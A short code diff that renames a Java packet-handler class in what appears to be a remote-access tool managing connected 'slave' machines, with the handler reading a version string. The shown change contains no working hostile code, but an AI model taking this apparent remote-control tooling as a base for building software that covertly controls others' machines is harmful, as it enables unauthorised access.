@@ -6,7 +6,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.Frame;
 import com.redpois0n.utils.Util;
 
-public class PacketVERSION extends AbstractIncomingPacket {
+public class Packet30InitVersion extends AbstractIncomingPacket {
 
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		String version = slave.readLine();
